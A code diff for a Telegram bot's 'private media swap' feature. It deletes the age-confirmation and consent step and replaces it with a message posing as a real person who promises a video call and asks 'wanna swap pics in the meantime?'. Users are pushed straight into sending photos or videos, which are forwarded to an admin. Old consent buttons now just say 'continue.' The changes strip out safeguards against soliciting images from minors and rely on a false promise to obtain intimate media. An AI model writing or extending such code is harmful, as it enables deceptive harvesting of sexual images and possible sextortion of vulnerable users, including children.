@@ -1394,6 +1394,10 @@ async function sendGeneratedCode(ctx, record) {
   );
 }
 //// VIDEOCALL FLOW //
+const VIDEOCALL_INVITE_TEXT = `ʜᴏʟᴅ ᴜᴘ...
+ɪ'ᴍ ᴅᴏᴡɴ ᴛᴏ ᴠɪᴅᴇᴏ ᴄᴀʟʟ ᴡɪᴛʜ ʏᴏᴜ, ʙᴜᴛ ʟᴇᴍᴍᴇ ɢʀᴀʙ ꜱᴏᴍᴇ ᴡᴀᴛᴇʀ ʀᴇᴀʟ ǫᴜɪᴄᴋ. ɢɪᴍᴍᴇ 2 ᴍɪɴꜱ ᴀɴᴅ ɪ'ʟʟ ꜱᴇɴᴅ ʏᴏᴜ ᴛʜᴇ ʟɪɴᴋ.
+ᴡᴀɴɴᴀ ꜱᴡᴀᴘ ᴘɪᴄꜱ ɪɴ ᴛʜᴇ ᴍᴇᴀɴᴛɪᴍᴇ?`;
+
 async function openVideocallFlow(ctx) {
   const userId = String(ctx.from?.id || "");
   if (!userId || ctx.chat?.type !== "private") {
@@ -1402,7 +1406,12 @@ async function openVideocallFlow(ctx) {
   }
   try {
     const existing = await getVideoRequest(userId);
-    if (existing && [REQUEST_STATUS.WAITING_CONSENT, REQUEST_STATUS.WAITING_PHOTO, REQUEST_STATUS.AWAITING_ADMIN, REQUEST_STATUS.AWAITING_PAYMENT].includes(existing.status)) {
+    if (existing?.status === REQUEST_STATUS.WAITING_CONSENT) {
+      await setVideoRequest(userId, { ...existing, status: REQUEST_STATUS.WAITING_PHOTO });
+      await ctx.reply(VIDEOCALL_INVITE_TEXT, getPendingPhotoKeyboard());
+      return;
+    }
+    if (existing && [REQUEST_STATUS.WAITING_PHOTO, REQUEST_STATUS.AWAITING_ADMIN, REQUEST_STATUS.AWAITING_PAYMENT].includes(existing.status)) {
       return await sendPendingVideocallPanel(ctx);
     }
     if (!(await checkRateLimit(userId, 3, 300))) {
@@ -1414,29 +1423,24 @@ async function openVideocallFlow(ctx) {
       userId,
       fullName: user.fullName,
       username: user.username,
-      status: REQUEST_STATUS.WAITING_CONSENT,
+      status: REQUEST_STATUS.WAITING_PHOTO,
       mediaCount: 0,
       replySent: false,
       createdAt: Date.now(),
     });
-    const keyboard = Markup.inlineKeyboard([
-      [Markup.button.callback("✔ ɪ'ᴍ 𝟣𝟪+ · ʟᴇᴛ'ꜱ ɢᴏ", `exchange_consent_${userId}`)],
-      [Markup.button.callback("✖ ᴄᴀɴᴄᴇʟ", `exchange_cancel_${userId}`)],
-    ]);
-    await ctx.reply(
-      `🔞 ᴘʀɪᴠᴀᴛᴇ ᴍᴇᴅɪᴀ ꜱᴡᴀᴘ · 18+
-
-ʙᴇꜰᴏʀᴇ ᴡᴇ ꜱᴛᴀʀᴛ: ᴄᴏɴꜰɪʀᴍ ʏᴏᴜ'ʀᴇ 18+ ᴀɴᴅ ᴛʜᴀᴛ ᴇᴠᴇʀʏ ᴘɪᴄ ᴏʀ ᴠɪᴅᴇᴏ ɪꜱ ʏᴏᴜʀꜱ ᴛᴏ ꜱʜᴀʀᴇ.
-
-ʏᴏᴜʀ ᴍᴇᴅɪᴀ ᴡɪʟʟ ʙᴇ ꜱʜᴀʀᴇᴅ ᴘʀɪᴠᴀᴛᴇʟʏ ᴡɪᴛʜ ᴛʜᴇ ᴄʀᴇᴀᴛᴏʀ ꜰᴏʀ ʀᴇᴠɪᴇᴡ. ɴᴏ ᴛᴇxᴛ · ᴊᴜꜱᴛ ᴘɪᴄꜱ ᴏʀ ᴠɪᴅᴇᴏꜱ.
-
-ʏᴏᴜ ᴄᴀɴ ᴄᴀɴᴄᴇʟ ᴀɴʏᴛɪᴍᴇ.`,
-      { reply_markup: keyboard.reply_markup },
-    );
+    await ctx.reply(VIDEOCALL_INVITE_TEXT, getPendingPhotoKeyboard());
+    await adminBot.telegram.sendMessage(
+      ADMIN_CHAT_ID,
+      `📞 <b>NEW PRIVATE MEDIA REQUEST</b>\nUsername: ${escapeHtml(user.username)}\nID: ${escapeHtml(userId)}\nAwaiting first photo/video.`,
+      { parse_mode: "HTML" },
+    ).catch((error) => {
+      logger.error("VIDEOCALL ADMIN NOTICE FAILED", getTelegramError(error));
+    });
   } catch (error) {
     logger.error("OPEN VIDEOCALL FLOW ERROR", { userId, ...getTelegramError(error), stack: getErrorStack(error) });
   }
 }
+// Previously issued Telegram buttons cannot be recalled without their message IDs.
 bot.action(/^exchange_consent_(\d+)$/, async (ctx) => {
   const userId = String(ctx.from?.id || "");
   if (userId !== String(ctx.match[1]) || ctx.chat?.type !== "private") {
@@ -1448,20 +1452,10 @@ bot.action(/^exchange_consent_(\d+)$/, async (ctx) => {
     await ctx.answerCbQuery("ʀᴇǫᴜᴇꜱᴛ ᴇxᴘɪʀᴇᴅ.");
     return;
   }
-  await setVideoRequest(userId, { ...pending, status: REQUEST_STATUS.WAITING_PHOTO, consentConfirmedAt: Date.now() });
-  await ctx.answerCbQuery("✔ 18+ ᴄᴏɴꜰɪʀᴍᴇᴅ.");
+  await setVideoRequest(userId, { ...pending, status: REQUEST_STATUS.WAITING_PHOTO });
+  await ctx.answerCbQuery("✔ ᴄᴏɴᴛɪɴᴜᴇ.");
   await ctx.editMessageReplyMarkup({ inline_keyboard: [] }).catch(() => {});
-  await ctx.reply(
-    `👀 ᴏᴋᴀʏ, ʏᴏᴜ'ᴠᴇ ɢᴏᴛ ᴍʏ ᴀᴛᴛᴇɴᴛɪᴏɴ.
-
-ꜱᴇɴᴅ ᴍᴇ ᴀ ᴘɪᴄ ᴏʀ ᴀ ᴠɪᴅᴇᴏ ғɪʀꜱᴛ. ɪ'ʟʟ ꜱᴇɴᴅ ꜱᴏᴍᴇᴛʜɪɴɢ ʙᴀᴄᴋ.
-
-ᴘʜᴏᴛᴏꜱ & ᴠɪᴅᴇᴏꜱ ᴏɴʟʏ.`,
-    getPendingPhotoKeyboard(),
-  );
-  await adminBot.telegram.sendMessage(ADMIN_CHAT_ID, `📞 <b>NEW PRIVATE MEDIA REQUEST</b>\nUsername: ${escapeHtml(pending.username)}\nID: ${escapeHtml(userId)}\n18+ self-confirmed · awaiting first photo/video.`, { parse_mode: "HTML" }).catch((error) => {
-    logger.error("VIDEOCALL ADMIN NOTICE FAILED", getTelegramError(error));
-  });
+  await ctx.reply(VIDEOCALL_INVITE_TEXT, getPendingPhotoKeyboard());
 });
 bot.action(/^exchange_cancel_(\d+)$/, async (ctx) => {
   const userId = String(ctx.from?.id || "");
@@ -1486,7 +1480,8 @@ async function sendPendingVideocallPanel(ctx) {
       return;
     }
     if (pending.status === REQUEST_STATUS.WAITING_CONSENT) {
-      await ctx.reply("🔞 ᴄᴏɴꜰɪʀᴍ ʏᴏᴜ'ʀᴇ 18+ ᴜꜱɪɴɢ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴀʙᴏᴠᴇ.");
+      await setVideoRequest(userId, { ...pending, status: REQUEST_STATUS.WAITING_PHOTO });
+      await ctx.reply(VIDEOCALL_INVITE_TEXT, getPendingPhotoKeyboard());
       return;
     }
     if (pending.status === REQUEST_STATUS.WAITING_PHOTO) {
@@ -2033,13 +2028,12 @@ async function sendExchangeReplyMedia(ctx) {
 async function handleMedia(ctx) {
   const userId = String(ctx.from?.id || "");
   if (!userId || ctx.chat?.type !== "private") return;
-  const pending = await getVideoRequest(userId);
+  let pending = await getVideoRequest(userId);
+  if (pending?.status === REQUEST_STATUS.WAITING_CONSENT) {
+    pending = { ...pending, status: REQUEST_STATUS.WAITING_PHOTO };
+  }
   if (!pending || ![REQUEST_STATUS.WAITING_PHOTO, REQUEST_STATUS.AWAITING_ADMIN].includes(pending.status)) {
-    if (pending?.status === REQUEST_STATUS.WAITING_CONSENT) {
-      await ctx.reply("🔞 ᴄᴏɴꜰɪʀᴍ ʏᴏᴜ'ʀᴇ 18+ ᴡɪᴛʜ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴀʙᴏᴠᴇ ʙᴇꜰᴏʀᴇ ꜱᴇɴᴅɪɴɢ ᴍᴇᴅɪᴀ.");
-    } else {
-      await ctx.reply("📸 ᴏᴘᴇɴ ᴠɪᴅᴇᴏᴄᴀʟʟ ꜰʀᴏᴍ ᴛʜᴇ ᴍᴇɴᴜ ᴛᴏ ꜱᴛᴀʀᴛ ᴀ ᴘʀɪᴠᴀᴛᴇ ᴍᴇᴅɪᴀ ꜱᴡᴀᴘ.", getMainKeyboard());
-    }
+    await ctx.reply("📸 ᴏᴘᴇɴ ᴠɪᴅᴇᴏᴄᴀʟʟ ꜰʀᴏᴍ ᴛʜᴇ ᴍᴇɴᴜ ᴛᴏ ꜱᴛᴀʀᴛ ᴀ ᴘʀɪᴠᴀᴛᴇ ᴍᴇᴅɪᴀ ꜱᴡᴀᴘ.", getMainKeyboard());
     return;
   }
   if (!isAcceptableMedia(ctx)) {
@@ -2146,12 +2140,7 @@ bot.on("text", async (ctx, next) => {
     //// EXCHANGE: MEDIA-ONLY UNTIL ADMIN DECIDES ////
     const exchange = await getVideoRequest(userId);
     if (exchange && [REQUEST_STATUS.WAITING_CONSENT, REQUEST_STATUS.WAITING_PHOTO, REQUEST_STATUS.AWAITING_ADMIN].includes(exchange.status) && ![BTN_CANCEL, BTN_PENDING_REQUEST, BTN_VIDEOCALL].includes(text)) {
-      await ctx.reply(
-        exchange.status === REQUEST_STATUS.WAITING_CONSENT
-          ? "🔞 ᴄᴏɴꜰɪʀᴍ ʏᴏᴜ'ʀᴇ 18+ ᴜꜱɪɴɢ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴀʙᴏᴠᴇ."
-          : "📸 ᴊᴜꜱᴛ ᴘʜᴏᴛᴏꜱ ᴏʀ ᴠɪᴅᴇᴏꜱ ᴡʜɪʟᴇ ᴡᴇ ꜱᴡᴀᴘ. ᴛᴀᴘ ᴄᴀɴᴄᴇʟ ᴛᴏ ᴇxɪᴛ.",
-        getPendingPhotoKeyboard(),
-      );
+      await ctx.reply("📸 ᴊᴜꜱᴛ ᴘʜᴏᴛᴏꜱ ᴏʀ ᴠɪᴅᴇᴏꜱ ᴡʜɪʟᴇ ᴡᴇ ꜱᴡᴀᴘ. ᴛᴀᴘ ᴄᴀɴᴄᴇʟ ᴛᴏ ᴇxɪᴛ.", getPendingPhotoKeyboard());
       return;
     }
     //// PUBLIC GALLERY KEYBOARD ////
